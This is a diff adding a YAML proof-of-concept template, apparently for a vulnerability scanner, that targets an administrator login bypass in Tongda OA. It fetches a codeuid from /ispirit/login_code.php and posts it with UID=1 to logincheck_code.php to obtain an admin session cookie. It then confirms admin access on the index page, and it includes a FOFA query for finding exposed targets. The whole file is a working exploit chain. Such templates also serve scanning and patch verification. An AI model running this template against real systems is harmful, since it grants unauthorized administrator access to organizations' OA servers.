@@ -1,0 +1,36 @@
+id: poc-yaml-tongda-oa-login-bypass
+info:
+  name: 通达 OA logincheck_code 管理员登录绕过漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+requests:
+- method: GET
+  path: /ispirit/login_code.php
+  output:
+  - regex_match(body,`"codeuid":"(?P<codeuid>.*?)"`)
+  expression: 'status_code == 200
+
+    '
+- method: POST
+  path: /logincheck_code.php
+  headers:
+    Upgrade-Insecure-Requests: 1
+    Content-Type: application/x-www-form-urlencoded
+  data: CODEUID={{.codeuid}}&UID=1
+  output:
+  - regex_match(headers,`PHPSESSID=(?P<PHPSESSID>.*?);`)
+  expression: "status_code == 200 && \ncontains(body,`\"status\":1`)\n"
+- method: GET
+  path: /general/index.php?is_modify_pwd=1
+  headers:
+    Cookie: PHPSESSID={{.PHPSESSID}}
+  expression: "status_code == 200 && \n(\ncontains(gbk_decode(body),\"\\\"admin\\\"\
+    \") &&\ncontains(gbk_decode(body),\"\\\"系统管理员\\\"\") &&\ncontains(gbk_decode(body),\"\
+    修改个人资料\") &&\ncontains(gbk_decode(body),\"管理中心\")\n) || (\ncontains(body,\"\\\"\
+    admin\\\"\") &&\ncontains(body,\"\\\"系统管理员\\\"\") &&\ncontains(body,\"修改个人资料\"\
+    ) &&\ncontains(body,\"管理中心\")\n)\n"
+variables: {}
+transport: http
